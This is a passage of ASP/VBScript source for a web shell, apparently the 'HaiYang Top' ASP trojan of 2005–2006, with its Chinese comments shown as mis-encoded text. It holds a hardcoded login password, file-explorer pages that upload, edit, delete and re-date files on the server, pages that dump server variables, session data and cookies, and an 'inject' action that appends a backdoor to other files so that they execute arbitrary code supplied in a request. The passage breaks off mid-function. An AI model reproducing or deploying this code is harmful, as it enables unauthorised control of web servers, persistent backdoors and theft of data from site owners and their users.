   <object runat="server" id="ws" scope="page" classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
   <object runat="server" id="ws" scope="page" classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
   <object runat="server" id="fso" scope="page" classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>
   <object runat="server" id="sa" scope="page" classid="clsid:13709620-C279-11CE-A49E-444553540000"></object>
   <%
   '   Option Explicit

       Dim theAct, sTime, aspPath, pageName, strBackDoor, fsoX, saX, wsX

       sTime = Timer
       theAct= Request("theAct")
       pageName = Request("pageName")
       aspPath = Replace(Server.MapPath(".") & "\~86.tmp", "\\", "\") ''ÏµÍ³ÁÙÊ±ÎÄ¼þ
       strBackDoor = "<script language=vbscript runat=server>"
       strBackDoor = strBackDoor & "If Request(""" & clientPassword & """)<>"""" Then Session(""#"")=Request(""" & clientPassword & """)" & VbNewLine
       strBackDoor = strBackDoor & "If Session(""#"")<>"""" Then Execute(Session(""#""))"
       strBackDoor = strBackDoor & "</script>"                         ''²åÈëµÄºóÃÅ´úÂë

       Const m = "HYTop2006"                   ''×Ô¶¨ÒåSessionÇ°×º
       Const showLogin = ""                    ''Îª¿ÕÖ±½ÓÏÔÊ¾µÇÂ¼½çÃæ,·ñÔòÓÃ"?pageName=ËüµÄÖµ"À´½øÐÐ·ÃÎÊ
       Const clientPassword = "#"              ''²åÈëºóÃÅµÄÃÜÂë,Èç¹ûÒª²åÈëÊý¾Ý¿âÖÐ,Ö»ÄÜÎªÒ»¸ö×Ö·û.
       Const dbSelectNumber = 10               ''Êý¾Ý¿â²Ù×÷Ê±Ä¬ÈÏ´Ó±íÖÐÑ¡È¡µÄÊý¾ÝÁ¿
       Const isDebugMode = False               ''ÊÇ·ñµ÷ÊÔÄ£Ê½
       Const myName = "Ö¥Âé¿ªÃÅ,Å¼ÊÇÀÏÂí"          ''µÇÂ¼Ò³°´Å¤ÉÏµÄÎÄ×Ö
       Const notdownloadsExists = False        ''ÔACCESSÊý¾Ý¿âÖÐÊÇ·ñ´æÔÚnotdownloadsExists±í
       Const userPassword = "lcxMarcos"        ''¹ÜÀíÃÜÂë
       Const myCmdDotExeFile = "command.com"   ''¶¨Òåcmd.exeÎÄ¼þµÄÎÄ¼þÃû
       Const strJsCloseMe = "<input type=button value=' ¹Ø±Õ ' onclick='window.close();'>"

       Sub createIt(fsoX, saX, wsX)
           If isDebugMode = False Then
               On Error Resume Next
           End If

           Set fsoX = Server.CreateObject("Scripting.FileSystemObject")
           If IsEmpty(fsoX) And (pageName = "FsoFileExplorer" Or theAct = "fsoSearch") Then
               Set fsoX = fso
           End If

           Set saX = Server.CreateObject("Shell.Application")
           If IsEmpty(saX) And (pageName = "AppFileExplorer" Or pageName = "SaCmdRun" Or theAct = "saSearch") Then
               Set saX = sa
           End If

           Set wsX = Server.CreateObject("WScript.Shell")
           If IsEmpty(wsX) And (pageName = "WsCmdRun" Or theAct = "getTerminalInfo" Or theAct = "readReg") Then
               Set wsX = ws
           End If

           If Err Then
               Err.Clear
           End If
       End Sub

       Sub chkErr(Err)
           If Err Then
               echo "<style>body{margin:8;border:none;overflow:hidden;background-color:buttonface;}</style>"
               echo "<br/><font size=2><li>´íÎó: " & Err.Description & "</li><li>´íÎóÔ´: " & Err.Source & "</li><br/>"
               echo "<hr>Powered By Marcos 2005.02</font>"
               Err.Clear
               Response.End
           End If
       End Sub

       Sub echo(str)
           Response.Write(str)
       End Sub

       Sub isIn()
           If pageName <> "" And PageName <> "login" And PageName <> showLogin Then
               If Session(m & "userPassword") <> userPassword Then
                   Response.End
               End If
           End If
       End Sub

       Sub showTitle(str)
           echo "<title>" & str & " - º£Ñô¶¥¶ËÍøASPÄ¾Âí2006 - By Marcos & LCX</title>" & vbNewLine
           echo "<meta http-equiv='Content-Type' content='text/html; charset=gb2312'>" & vbNewLine
           echo "<!--" & vbNewLine
           echo "=ÖÔÐÄ¸ÐÐ»=====================================================" & vbNewLine
           echo "Íø³½ÔÚÏß¡¢»¯¾³±à³Ì¡¢¹ðÁÖÀÏ±ø¡¢±ùºüÀË×Ó¡¢À¶ÆÁ¡¢Ð¡Â·¡¢wangyong¡¢" & vbNewLine
           echo "czy¡¢allen¡¢lcx¡¢Marcos¡¢kEvin1986¡¢myth¶Ôº£Ñô¶¥¶ËÍøaspÄ¾ÂíËù" & vbNewLine
           echo "×öµÄÒ»ÇÐÅ¬Á¦£¡" & vbNewLine
           echo "==============================================================" & vbNewLine & vbNewLine
           echo "=±¾°æ¹ØÓÚ=====================================================" & vbNewLine
           echo "³ÌÐò±àÐ´: Marcos" & vbNewLine
           echo "ÁªÏµ·½Ê½: QQ26696782" & vbNewLine
           echo "·¢²¼Ê±¼ä: 2005.02.28" & vbNewLine
           echo "³ö Æ· ÈË: Allen, lcx, Marcos" & vbNewLine
           echo "¹Ù·½·¢²¼: WWW.HIDIDI.NET(2) WWW.HAIYANGTOP.NET(1)" & vbNewLine
           echo "==============================================================" & vbNewLine
           echo "-->" & vbNewLine
           PageOther()
       End Sub

       Function fixNull(str)
           If IsNull(str) Then
               str = " "
           End If
           fixNull = str
       End Function

       Function encode(str)
           str = Server.HTMLEncode(str)
           str = Replace(str, vbNewLine, "<br>")
           str = Replace(str, " ", "&nbsp;")
           str = Replace(str, "    ", "&nbsp;&nbsp;&nbsp;&nbsp;")
           encode = str
       End Function

       Function getTheSize(theSize)
           If theSize >= (1024 * 1024 * 1024) Then getTheSize = Fix((theSize / (1024 * 1024 * 1024)) * 100) / 100 & "G"
           If theSize >= (1024 * 1024) And theSize < (1024 * 1024 * 1024) Then getTheSize = Fix((theSize / (1024 * 1024)) * 100) / 100 & "M"
           If theSize >= 1024 And theSize < (1024 * 1024) Then getTheSize = Fix((theSize / 1024) * 100) / 100 & "K"
           If theSize >= 0 And theSize <1024 Then getTheSize = theSize & "B"
       End Function

       Function HtmlEncode(str)
           If isNull(str) Then
               Exit Function
           End If
           HtmlEncode = Server.HTMLEncode(str)
       End Function

       Function UrlEncode(str)
           If isNull(str) Then
               Exit Function
           End If
           UrlEncode = Server.UrlEncode(str)
       End Function

       Sub redirectTo(strUrl)
           Response.Redirect(Request.ServerVariables("URL") & strUrl)
       End Sub

       Function trimThePath(strPath)
           If Right(strPath, 1) = "\" And Len(strPath) > 3 Then
               strPath = Left(strPath, Len(strPath) - 1)
           End If
           trimThePath = strPath
       End Function

       Sub alertThenClose(strInfo)
           Response.Write "<script>alert(""" & strInfo & """);window.close();</script>"
       End Sub

       Sub showErr(str)
           Dim i, arrayStr
           str = Server.HtmlEncode(str)
           arrayStr = Split(str, "$$")
   '       Response.Clear
           echo "<font size=2>"
           echo "³ö´íÐÅÏ¢:<br/><br/>"
           For i = 0 To UBound(arrayStr)
               echo "&nbsp;&nbsp;" & (i + 1) & ". " & arrayStr(i) & "<br/>"
           Next
           echo "</font>"
           Response.End
       End Sub

       Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
       Rem     ÏÂÃæÊÇ³ÌÐòÄ£¿éÑ¡Ôñ²¿·Ö
       Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-


       isIn()

       Call createIt(fsoX, saX, wsX)

       Select Case pageName
           Case showLogin, "login"
               PageLogin()
           Case "PageList"
               PageList()
           Case "objOnSrv"
               PageObjOnSrv()
           Case "ServiceList"
               PageServiceList()
           Case "userList"
               PageUserList()
           Case "CSInfo"
               PageCSInfo()
           Case "infoAboutSrv"
               PageInfoAboutSrv()
           Case "AppFileExplorer"
               PageAppFileExplorer()
           Case "SaCmdRun"
               PageSaCmdRun()
           Case "WsCmdRun"
               PageWsCmdRun()
           Case "FsoFileExplorer"
               PageFsoFileExplorer()
           Case "MsDataBase"
               PageMsDataBase()
           Case "OtherTools"
               PageOtherTools()
           Case "TxtSearcher"
               PageTxtSearcher()
           Case "PageAddToMdb"
               PageAddToMdb()
       End Select

       Set saX = Nothing
       Set wsX = Nothing
       Set fsoX = Nothing

       Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=
       Rem     ÏÂÃæÊÇ¸÷¶ÀÁ¢¹¦ÄÜÄ£¿é
       Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=

       Sub PageAppFileExplorer()
           Response.Buffer = True
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim strExtName, thePath, objFolder, objMember, strDetails, strPath, strNewName
           Dim intI, theAct, strTmp, strFolderList, strFileList, strFilePath, strFileName, strParentPath

           showTitle("Shell.ApplicationÎÄ¼þä¯ÀÀÆ÷(&stream)")

           theAct = Request("theAct")
           strNewName = Request("newName")
           thePath = Replace(LTrim(Request("thePath")), "\\", "\")

           If theAct <> "upload" Then
               If Request.Form.Count > 0 Then
                   theAct = Request.Form("theAct")
                   thePath = Replace(LTrim(Request.Form("thePath")), "\\", "\")
               End If
           End If

           echo "<style>body{margin:8;}</style>"

           Select Case theAct
               Case "openUrl"
                   openUrl(thePath)
               Case "showEdit"
                   Call showEdit(thePath, "stream")
               Case "saveFile"
                   Call saveToFile(thePath, "stream")
               Case "copyOne", "cutOne"
                   If thePath = "" Then
                       alertThenClose("²ÎÊý´íÎó!")
                       Response.End
                   End If
                   Session(m & "appThePath") = thePath
                   Session(m & "appTheAct") = theAct
                   alertThenClose("²Ù×÷³É¹¦,ÇëÕ³Ìù!")
               Case "pastOne"
                   appDoPastOne(thePath)
                   alertThenClose("Õ³Ìù³É¹¦,ÇëË¢ÐÂ±¾Ò³²é¿´Ð§¹û!")
               Case "rename"
                   appRenameOne(thePath)
               Case "downTheFile"
                   downTheFile(thePath)
               Case "theAttributes"
                   appTheAttributes(thePath)
               Case "showUpload"
                   Call showUpload(thePath, "AppFileExplorer")
               Case "upload"
                   streamUpload(thePath)
                   Call showUpload(thePath, "AppFileExplorer")
               Case "inject"
                   strTmp = streamLoadFromFile(thePath)
                   fsoSaveToFile thePath, strTmp & strBackDoor
                   alertThenClose("ºóÃÅ²åÈë³É¹¦!")
           End Select

           If theAct <> "" Then
               Response.End
           End If


           Set objFolder = saX.NameSpace(thePath)

           If Request.Form.Count > 0 Then
               redirectTo("?pageName=AppFileExplorer&thePath=" & UrlEncode(thePath))
           End If
           echo "<input type=hidden name=usePath /><input type=hidden value=AppFileExplorer name=pageName />"
           echo "<input type=hidden value=""" & HtmlEncode(thePath) & """ name=truePath />"
           echo "<div style='left:0px;width:100%;height:48px;position:absolute;top:2px;' id=fileExplorerTools>"
           echo "<input type=button value=' ´ò¿ª ' onclick='openUrl();'>"
           echo "<input type=button value=' ±à¼ ' onclick='editFile();'>"
           echo "<input type=button value=' ¸´ÖÆ ' onclick=appDoAction('copyOne');>"
           echo "<input type=button value=' ¼ôÇÐ ' onclick=appDoAction('cutOne');>"
           echo "<input type=button value=' Õ³Ìù ' onclick=appDoAction2('pastOne');>"
           echo "<input type=button value=' ÉÏ´« ' onclick='upTheFile();'>"
           echo "<input type=button value=' ÏÂÔØ ' onclick='downTheFile();'>"
           echo "<input type=button value=' ÊôÐÔ ' onclick='appTheAttributes();'>"
           echo "<input type=button value=' ²åÈë ' onclick=appDoAction('inject');>"
           echo "<input type=button value='ÖØÃüÃû' onclick='appRename();'>"
           echo "<input type=button value='ÎÒµÄµçÄÔ' onclick=location.href='?pageName=AppFileExplorer&thePath='>"
           echo "<input type=button value='¿ØÖÆÃæ°å' onclick=location.href='?pageName=AppFileExplorer&thePath=::{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\::{21EC2020-3AEA-1069-A2DD-08002B30309D}'>"
           echo "<form method=post action='?pageName=AppFileExplorer'>"
           echo "<input type=button value=' ºóÍË ' onclick='this.disabled=true;history.back();' />"
           echo "<input type=button value=' Ç°½ø ' onclick='this.disabled=true;history.go(1);' />"
           echo "<input type=button value=Õ¾µã¸ù onclick=location.href=""?pageName=AppFileExplorer&thePath=" & URLEncode(Server.MapPath("\")) & """;>"
           echo "<input style='width:60%;' name=thePath value=""" & HtmlEncode(thePath) & """ />"
           echo "<input type=submit value=' GO.' /><input type=button value=' Ë¢ÐÂ ' onclick='location.reload();'></form><hr/>"
           echo "</div><div style='height:50px;'></div>"
           echo "<script>fixTheLayer('fileExplorerTools');setInterval(""fixTheLayer('fileExplorerTools');"", 200);</script>"

           For Each objMember In objFolder.Items
               intI = intI + 1
               If intI > 200 Then
                   intI = 0
                   Response.Flush()
               End If

               If objMember.IsFolder = True Then
                   If Left(objMember.Path, 2) = "::" Then
                       strPath = URLEncode(objMember.Path)
                    Else
                       strPath = URLEncode(objMember.Path) & "%5C"
                   End If
                   strFolderList = strFolderList & "<span id=""" & strPath & """ ondblclick='changeThePath(this);' onclick='changeMyClass(this);'><font class=font face=Wingdings>0</font><br/>" & objMember.Name & "</span>"
                Else
                   strDetails = objFolder.GetDetailsOf(objMember, -1)
                   strFilePath = objMember.Path
                   strFileName = Mid(strFilePath, InStrRev(strFilePath, "\") + 1)
                   strExtName = Split(strFileName, ".")(UBound(Split(strFileName, ".")))
                   strFileList = strFileList & "<span title=""" & strDetails & """ ondblclick='openUrl();' id=""" & URLEncode(strFilePath) & """ onclick='changeMyClass(this);'><font class=font face=" & getFileIcon(strExtName) & "</font><br/>" & strFileName & "</span>"
               End If
           Next
           chkErr(Err)

           strParentPath = getParentPath(thePath)
           If thePath <> "" And Left(thePath, 2) <> "::" Then
               strFolderList = "<span id=""" & URLEncode(strParentPath) & """ ondblclick='changeThePath(this);' onclick='changeMyClass(this);'><font class=font face=Wingdings>0</font><br/>..</span>" & strFolderList
           End If

           echo "<div id=FileList>"
           echo strFolderList & strFileList
           echo "</div>"
           echo "<hr/>Powered By Marcos 2005.02"

           Set objFolder = Nothing
       End Sub

       Function getParentPath(strPath)
           If Right(strPath, 1) = "\" Then
               strPath = Left(strPath, Len(strPath) - 1)
           End If
           If Len(strPath) = 2 Then
               getParentPath = " "
            Else
               getParentPath = Left(strPath, InStrRev(strPath, "\"))
           End If
       End Function

       Function streamSaveToFile(thePath, fileContent)
           Dim stream
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Set stream = Server.CreateObject("adodb.stream")
           With stream
               .Type=2
               .Mode=3
               .Open
               chkErr(Err)
               .Charset="gb2312"
               .WriteText fileContent
               .saveToFile thePath, 2
               .Close
           End With
           Set stream = Nothing
       End Function

       Sub appDoPastOne(thePath)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim strAct, strPath
           dim objTargetFolder
           strAct = Session(m & "appTheAct")
           strPath = Session(m & "appThePath")

           If strAct = "" Or strPath = "" Then
               alertThenClose("²ÎÊý´íÎó,Õ³ÌùÇ°ÇëÏÈ¸´ÖÆ/¼ôÇÐ!")
               Exit Sub
           End If

           If InStr(LCase(thePath), LCase(strPath)) > 0 Then
               alertThenClose("Ä¿±êÎÄ¼þ¼ÐÔÚÔ´ÎÄ¼þ¼ÐÄÚ,·Ç·¨²Ù×÷!")
               Exit Sub
           End If

           strPath = trimThePath(strPath)
           thePath = trimThePath(thePath)

           Set objTargetFolder = saX.NameSpace(thePath)
           If strAct = "copyOne" Then
               objTargetFolder.CopyHere(strPath)
            Else
               objTargetFolder.MoveHere(strPath)
           End If
           chkErr(Err)

           Set objTargetFolder = Nothing
       End Sub

       Sub appTheAttributes(thePath)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim i, strSth, objFolder, objItem, strModifyDate
           strModifyDate = Request("ModifyDate")

           thePath = trimThePath(thePath)

           If thePath = "" Then
               alertThenClose("Ã»ÓÐÑ¡ÔñÈÎºÎÎÄ¼þ(¼Ð)!")
               Exit Sub
           End If

           strSth = Left(thePath, InStrRev(thePath, "\"))
           Set objFolder = saX.NameSpace(strSth)
           chkErr(Err)
           strSth = Split(thePath, "\")(UBound(Split(thePath, "\")))
           Set objItem = objFolder.ParseName(strSth)
           chkErr(Err)

           If isDate(strModifyDate) Then
               objItem.ModifyDate = strModifyDate
               alertThenClose("ÐÞ¸Ä³É¹¦!")
               Set objItem = Nothing
               Set objFolder = Nothing
               Exit Sub
           End If

   '       strSth = objFolder.GetDetailsOf(objItem, -1)
   '       strSth = Replace(strSth, chr(10), "<br/>")
           For i = 1 To 8
               strSth = strSth & "<br/>ÊôÐÔ(" & i & "): " & objFolder.GetDetailsOf(objItem, i)
           Next
           strSth = Replace(strSth, "ÊôÐÔ(1)", "´óÐ¡")
           strSth = Replace(strSth, "ÊôÐÔ(2)", "ÀàÐÍ")
           strSth = Replace(strSth, "ÊôÐÔ(3)", "×îºóÐÞ¸Ä")
           strSth = Replace(strSth, "ÊôÐÔ(8)", "ËùÓÐÕß")
           strSth = strSth & "<form method=post>"
           strSth = strSth & "<input type=hidden name=theAct value=theAttributes>"
           strSth = strSth & "<input type=hidden name=thePath value=""" & thePath & """>"
           strSth = strSth & "<br/>×îºóÐÞ¸Ä: <input size=30 value='" & objFolder.GetDetailsOf(objItem, 3) & "' name=ModifyDate />"
           strSth = strSth & "<input type=submit value=' ÐÞ¸Ä '>"
           strSth = strSth & "</form>"
           echo strSth

           Set objItem = Nothing
           Set objFolder = Nothing
       End Sub

       Sub appRenameOne(thePath)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim strSth, fileName, objItem, objFolder
           fileName = Request("fileName")

           thePath = trimThePath(thePath)

           strSth = Left(thePath, InStrRev(thePath, "\"))
           Set objFolder = saX.NameSpace(strSth)
           chkErr(Err)
           strSth = Split(thePath, "\")(UBound(Split(thePath, "\")))
           Set objItem = objFolder.ParseName(strSth)
           chkErr(Err)
           strSth = Split(thePath, ".")(UBound(Split(thePath, ".")))

           If fileName <> "" Then
               objItem.Name = fileName
               chkErr(Err)
               alertThenClose("ÖØÃüÃû³É¹¦,Ë¢ÐÂ±¾Ò³¿ÉÒÔ¿´µ½Ð§¹û!")
               Set objItem = Nothing
               Set objFolder = Nothing
               Exit Sub
           End If

           echo "<form method=post>ÖØÃüÃû:"
           echo "<input type=hidden name=theAct value=rename>"
           echo "<input type=hidden name=thePath value=""" & thePath & """>"
           echo "<br/><input size=30 value=""" & objItem.Name & """ name=fileName />"
           If InStr(strSth, ":") <= 0 Then
               echo "." & strSth
           End If
           echo "<hr/><input type=submit value=' ÐÞ¸Ä '>" & strJsCloseMe
           echo "</form>"

           Set objItem = Nothing
           Set objFolder = Nothing
       End Sub

       Sub PageCSInfo()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim strKey, strVar, strVariable

           showTitle("¿Í»§¶Ë·þÎñÆ÷½»»¥ÐÅÏ¢")

           echo "<a href=javascript:showHideMe(ServerVariables);>ServerVariables:</a>"
           echo "<span id=ServerVariables style='display:none;'>"
           For Each strVariable In Request.ServerVariables
               echo "<li>" & strVariable & ": " & Request.ServerVariables(strVariable) & "</li>"
           Next
           echo "</span>"

           echo "<br/><a href=javascript:showHideMe(Application);>Application:</a>"
           echo "<span id=Application style='display:none;'>"
           For Each strVariable In Application.Contents
               echo "<li>" & strVariable & ": " & Encode(Application(strVariable)) & "</li>"
               If Err Then
                   For Each strVar In Application.Contents(strVariable)
                       echo "<li>" & strVariable & "(" & strVar & "): " & Encode(Application(strVariable)(strVar)) & "</li>"
                   Next
                   Err.Clear
               End If
           Next
           echo "</span>"

           echo "<br/><a href=javascript:showHideMe(Session);>Session:(ID" & Session.SessionId & ")</a>"
           echo "<span id=Session style='display:none;'>"
           For Each strVariable In Session.Contents
               echo "<li>" & strVariable & ": " & Encode(Session(strVariable)) & "</li>"
           Next
           echo "</span>"

           echo "<br/><a href=javascript:showHideMe(Cookies);>Cookies:</a>"
           echo "<span id=Cookies style='display:none;'>"
           For Each strVariable In Request.Cookies
               If Request.Cookies(strVariable).HasKeys Then
                   For Each strKey In Request.Cookies(strVariable)
                       echo "<li>" & strVariable & "(" & strKey & "): " & HtmlEncode(Request.Cookies(strVariable)(strKey)) & "</li>"
                   Next
                Else
                   echo "<li>" & strVariable & ": " & Encode(Request.Cookies(strVariable)) & "</li>"
               End If
           Next
           echo "</span><hr/>Powered By Marcos 2005.02"

       End Sub

       Sub PageFsoFileExplorer()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Response.Buffer = True
           Dim file, drive, folder, theFiles, theFolder, theFolders
           Dim i, theAct, strTmp, driveStr, thePath, parentFolderName

           theAct = Request("theAct")
           thePath = Request("thePath")
           If theAct <> "upload" Then
               If Request.Form.Count > 0 Then
                   theAct = Request.Form("theAct")
                   thePath = Request.Form("thePath")
               End If
           End If

           showTitle("FSOÎÄ¼þä¯ÀÀÆ÷(&stream)")

           Select Case theAct
               Case "newOne", "doNewOne"
                   fsoNewOne(thePath)
               Case "showEdit"
                   Call showEdit(thePath, "fso")
               Case "saveFile"
                   Call saveToFile(thePath, "fso")
               Case "openUrl"
                   openUrl(thePath)
               Case "copyOne", "cutOne"
                   If thePath = "" Then
                       alertThenClose("²ÎÊý´íÎó!")
                       Response.End
                   End If
                   Session(m & "fsoThePath") = thePath
                   Session(m & "fsoTheAct") = theAct
                   alertThenClose("²Ù×÷³É¹¦,ÇëÕ³Ìù!")
               Case "pastOne"
                   fsoPastOne(thePath)
                   alertThenClose("Õ³Ìù³É¹¦,ÇëË¢ÐÂ±¾Ò³²é¿´Ð§¹û!")
               Case "showFsoRename"
                   showFsoRename(thePath)
               Case "doRename"
                   Call fsoRename(thePath)
                   alertThenClose("ÖØÃüÃû³É¹¦,Ë¢ÐÂºó¿ÉÒÔ¿´µ½Ð§¹û!")
               Case "delOne", "doDelOne"
                   showFsoDelOne(thePath)
               Case "getAttributes", "doModifyAttributes"
                   fsoTheAttributes(thePath)
               Case "downTheFile"
                   downTheFile(thePath)
               Case "showUpload"
                   Call showUpload(thePath, "FsoFileExplorer")
               Case "upload"
                   streamUpload(thePath)
                   Call showUpload(thePath, "FsoFileExplorer")
               Case "inject"
                   Set theFiles = fsoX.OpenTextFile(thePath)
                   strTmp = theFiles.ReadAll()
                   fsoSaveToFile thePath, strTmp & strBackDoor
                   Set theFiles = Nothing
                   alertThenClose("ºóÃÅ²åÈë³É¹¦!")
           End Select

           If theAct <> "" Then
               Response.End
           End If

           If Request.Form.Count > 0 Then
               redirectTo("?pageName=FsoFileExplorer&thePath=" & UrlEncode(thePath))
           End If

           parentFolderName = fsoX.GetParentFolderName(thePath)

           echo "<div style='left:0px;width:100%;height:48px;position:absolute;top:2px;' id=fileExplorerTools>"
           echo "<input type=button value=' ÐÂ½¨ ' onclick=newOne();>"
           echo "<input type=button value=' ¸üÃû ' onclick=fsoRename();>"
           echo "<input type=button value=' ±à¼ ' onclick=editFile();>"
           echo "<input type=button value=' ´ò¿ª ' onclick=openUrl();>"
           echo "<input type=button value=' ¸´ÖÆ ' onclick=appDoAction('copyOne');>"
           echo "<input type=button value=' ¼ôÇÐ ' onclick=appDoAction('cutOne');>"
           echo "<input type=button value=' Õ³Ìù ' onclick=appDoAction2('pastOne')>"
           echo "<input type=button value=' ÊôÐÔ ' onclick=fsoGetAttributes();>"
           echo "<input type=button value=' ²åÈë ' onclick=appDoAction('inject');>"
           echo "<input type=button value=' É¾³ý ' onclick=delOne();>"
           echo "<input type=button value=' ÉÏ´« ' onclick='upTheFile();'>"
           echo "<input type=button value=' ÏÂÔØ ' onclick='downTheFile();'>"
           echo "<br/>"
           echo "<input type=hidden value=FsoFileExplorer name=pageName />"
           echo "<input type=hidden value=""" & UrlEncode(thePath) & """ name=truePath>"
           echo "<input type=hidden size=50 name=usePath>"

           echo "<form method=post action=?pageName=FsoFileExplorer>"
           If parentFolderName <> "" Then
               echo "<input value='¡üÏòÉÏ' type=button onclick=""this.disabled=true;location.href='?pageName=FsoFileExplorer&thePath=" & Server.UrlEncode(parentFolderName) & "';"">"
           End If
           echo "<input type=button value=' ºóÍË ' onclick='this.disabled=true;history.back();' />"
           echo "<input type=button value=' Ç°½ø ' onclick='this.disabled=true;history.go(1);' />"
           echo "<input size=60 value=""" & HtmlEncode(thePath) & """ name=thePath>"
           echo "<input type=submit value=' ×ªµ½ '>"
           driveStr = "<option>ÅÌ·û</option>"
           driveStr = driveStr & "<option value='" & HtmlEncode(Server.MapPath(".")) & "'>.</option>"
           driveStr = driveStr & "<option value='" & HtmlEncode(Server.MapPath("/")) & "'>/</option>"
           For Each drive In fsoX.Drives
               driveStr = driveStr & "<option value='" & drive.DriveLetter & ":\'>" & drive.DriveLetter & ":\</option>"
           Next
           echo "<input type=button value=' Ë¢ÐÂ ' onclick='location.reload();'> "
           echo "<select onchange=""this.form.thePath.value=this.value;this.form.submit();"">" & driveStr & "</select>"
           echo "<hr/></form>"
           echo "</div><div style='height:50px;'></div>"
           echo "<script>fixTheLayer('fileExplorerTools');setInterval(""fixTheLayer('fileExplorerTools');"", 200);</script>"

           If fsoX.FolderExists(thePath) = False Then
               showErr(thePath & " Ä¿Â¼²»´æÔÚ»òÕß²»ÔÊÐí·ÃÎÊ!")
           End If
           Set theFolder = fsoX.GetFolder(thePath)
           Set theFiles = theFolder.Files
           Set theFolders = theFolder.SubFolders

           echo "<div id=FileList>"
           For Each folder In theFolders
               i = i + 1
               If i > 50 Then
                   i = 0
                   Response.Flush()
               End If
               strTmp = UrlEncode(folder.Path & "\")
               echo "<span id='" & strTmp & "' onDblClick=""changeThePath(this);"" onclick=changeMyClass(this);><font class=font face=Wingdings>0</font><br/>" & folder.Name & "</span>" & vbNewLine
           Next
           Response.Flush()
           For Each file In theFiles
               i = i + 1
               If i > 100 Then
                   i = 0
                   Response.Flush()
               End If
               echo "<span id='" & UrlEncode(file.Path) & "' title='ÀàÐÍ: " & file.Type & vbNewLine & "´óÐ¡: " & getTheSize(file.Size) & "' onDblClick=""openUrl();"" onclick=changeMyClass(this);><font class=font face=" & getFileIcon(fsoX.GetExtensionName(file.Name)) & "</font><br/>" & file.Name & "</span>" & vbNewLine
           Next
           echo "</div>"
           chkErr(Err)

           echo "<hr/>Powered By Marcos 2005.02"
       End Sub

       Sub fsoNewOne(thePath)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim theAct, isFile, theName, newAct
           isFile = Request("isFile")
           newAct = Request("newAct")
           theName = Request("theName")

           If newAct = " È·¶¨ " Then
               thePath = Replace(thePath & "\" & theName, "\\", "\")
               If isFile = "True" Then
                   Call fsoX.CreateTextFile(thePath, False)
                Else
                   fsoX.CreateFolder(thePath)
               End If
               chkErr(Err)
               alertThenClose("ÎÄ¼þ(¼Ð)ÐÂ½¨³É¹¦,Ë¢ÐÂºó¾Í¿ÉÒÔ¿´µ½Ð§¹û!")
               Response.End
           End If

           echo "<style>body{overflow:hidden;}</style>"
           echo "<body topmargin=2>"
           echo "<form method=post>"
           echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """><br/>ÐÂ½¨: "
           echo "<input type=radio name=isFile id=file value='True' checked><label for=file>ÎÄ¼þ</label> "
           echo "<input type=radio name=isFile id=folder value='False'><label for=folder>ÎÄ¼þ¼Ð</label><br/>"
           echo "<input size=38 name=theName><hr/>"
           echo "<input type=hidden name=theAct value=doNewOne>"
           echo "<input type=submit name=newAct value=' È·¶¨ '>" & strJsCloseMe
           echo "</form>"
           echo "</body><br/>"
       End Sub

       Sub fsoPastOne(thePath)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim sessionPath
           sessionPath = Session(m & "fsoThePath")

           If thePath = "" Or sessionPath = "" Then
               alertThenClose("²ÎÊý´íÎó!")
               Response.End
           End If

           If Right(thePath, 1) = "\" Then
               thePath = Left(thePath, Len(thePath) - 1)
           End If

           If Right(sessionPath, 1) = "\" Then
               sessionPath = Left(sessionPath, Len(sessionPath) - 1)
               If Session(m & "fsoTheAct") = "cutOne" Then
                   Call fsoX.MoveFolder(sessionPath, thePath & "\" & fsoX.GetFileName(sessionPath))
                Else
                   Call fsoX.CopyFolder(sessionPath, thePath & "\" & fsoX.GetFileName(sessionPath))
               End If
            Else
               If Session(m & "fsoTheAct") = "cutOne" Then
                   Call fsoX.MoveFile(sessionPath, thePath & "\" & fsoX.GetFileName(sessionPath))
                Else
                   Call fsoX.CopyFile(sessionPath, thePath & "\" & fsoX.GetFileName(sessionPath))
               End If
           End If

           chkErr(Err)
       End Sub

       Sub fsoRename(thePath)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim theFile, fileName, theFolder
           fileName = Request("fileName")

           If thePath = "" Or fileName = "" Then
               alertThenClose("²ÎÊý´íÎó!")
               Response.End
           End If

           If Right(thePath, 1) = "\" Then
               Set theFolder = fsoX.GetFolder(thePath)
               theFolder.Name = fileName
               Set theFolder = Nothing
            Else
               Set theFile = fsoX.GetFile(thePath)
               theFile.Name = fileName
               Set theFile = Nothing
           End If

           chkErr(Err)
       End Sub

       Sub showFsoRename(thePath)
           Dim theAct, fileName
           fileName = fsoX.getFileName(thePath)

           echo "<style>body{overflow:hidden;}</style>"
           echo "<body topmargin=2>"
           echo "<form method=post>"
           echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """><br/>¸üÃûÎª:<br/>"
           echo "<input size=38 name=fileName value=""" & HtmlEncode(fileName) & """><hr/>"
           echo "<input type=submit value=' È·¶¨ '>"
           echo "<input type=hidden name=theAct value=doRename>"
           echo "<input type=button value=' ¹Ø±Õ ' onclick='window.close();'>"
           echo "</form>"
           echo "</body><br/>"
       End Sub

       Sub showFsoDelOne(thePath)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim newAct, theFile
           newAct = Request("newAct")

           If newAct = "È·ÈÏÉ¾³ý?" Then
               If Right(thePath, 1) = "\" Then
                   thePath = Left(thePath, Len(thePath) - 1)
                   Call fsoX.DeleteFolder(thePath, True)
                Else
                   Call fsoX.DeleteFile(thePath, True)
               End If
               chkErr(Err)
